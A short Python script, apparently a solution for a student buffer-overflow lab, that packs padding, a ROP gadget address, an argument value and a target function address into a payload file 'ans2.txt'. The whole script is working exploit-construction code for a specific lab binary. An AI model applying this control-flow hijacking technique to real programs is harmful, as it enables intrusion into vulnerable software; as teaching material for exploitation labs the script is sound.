import struct

# 1. 基础信息
padding_len = 16          
gadget_addr = 0x4012c7    
arg_val     = 0x3f8       
func2_addr  = 0x401216    

# 2. 构造 Payload

payload = b'A' * padding_len
payload += struct.pack('<Q', gadget_addr) 
payload += struct.pack('<Q', arg_val)     
payload += struct.pack('<Q', func2_addr)  

# 3. 写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)

print(f"Payload generated using:")
print(f"Padding: {padding_len}")
print(f"Gadget : {hex(gadget_addr)}")
print(f"Arg    : {hex(arg_val)}")
print(f"Target : {hex(func2_addr)}")